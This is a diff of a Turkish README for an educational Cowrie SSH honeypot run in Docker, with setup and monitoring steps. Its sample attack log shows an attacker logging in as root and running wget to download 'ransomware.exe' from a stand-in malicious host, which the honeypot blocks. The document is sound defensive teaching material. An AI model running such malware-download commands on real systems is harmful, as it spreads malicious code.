@@ -15,13 +15,43 @@ Amaç, gerçek bir sunucuyu taklit ederek saldırgan davranışlarını analiz e
 ## 🚀 Nasıl Çalışır?
 1.  **İzolasyon:** Sistem, ana işletim sisteminden izole bir Docker konteyneri içinde çalışır.
 2.  **Aldatma (Deception):** 2223 portu üzerinden gelen istekleri karşılar ve saldırgana sahte bir dosya sistemi sunar.
-3.  **Loglama:** Saldırganın denediği kullanıcı adları, şifreler ve çalıştırdığı komutlar json formatında kaydedilir.
+3.  **Loglama:** Saldırganın denediği kullanıcı adları, şifreler ve çalıştırdığı komutlar sistem tarafından kaydedilir.
+4.  **Güvenlik:** Sistem dış ağa kapalıdır, böylece saldırgan gerçek dünyada zarar veremez.
 
 ## 📊 Örnek Saldırı Logu (Kanıt)
-Proje geliştirme sürecinde simüle edilen bir saldırı girişimi:
+Proje geliştirme sürecinde simüle edilen bir saldırı girişimi ve sistemin tepkisi:
 
-> `Login attempt [root/123456] succeeded`
-> `CMD: wget http://malicious-site.com/virus.exe`
+> **Saldırgan:** `ssh root@localhost -p 2223` (Giriş Denemesi)
+> **Sistem:** `Login attempt [root/admin123] succeeded`
+>
+> **Saldırgan:** `wget http://dark-web-attack.com/ransomware.exe` (Zararlı Yazılım İndirme)
+> **Sistem:** `Attempt to access blocked network address` (Engellendi)
 
 ---
-*Bu proje, modern DevSecOps süreçlerini ve Bulut Güvenliği prensiplerini öğrenmek amacıyla geliştirilmiştir.*
+
+## 💻 Kurulum ve Kullanım (How to Run)
+
+Bu projeyi kendi bilgisayarınızda test etmek için Docker'ın kurulu olması gerekmektedir. Aşağıdaki adımları sırasıyla uygulayın:
+
+### 1. Tuzağı Başlatın (Start Container)
+Önce Honeypot sunucusunu arka planda çalıştırın:
+
+docker run -p 2223:2222 --name honeypot -d cowrie/cowrie
+2. Saldırın (Attack Simulation)
+Yeni bir terminal penceresi açın ve kurduğunuz tuzağa sızmayı deneyin:
+
+Bash
+ssh -p 2223 root@localhost
+(Şifre sorulduğunda rastgele bir şifre girebilirsiniz.)
+
+3. İzleyin (Live Monitoring)
+Saldırganın (veya kendinizin) içeride ne yaptığını canlı izlemek için şu komutu girin:
+
+Bash
+docker logs -f honeypot
+
+4. Temizleyin (Stop & Cleanup)
+Test işleminiz bittiğinde tuzağı kapatmak ve silmek için:
+
+Bash
+docker rm -f honeypot
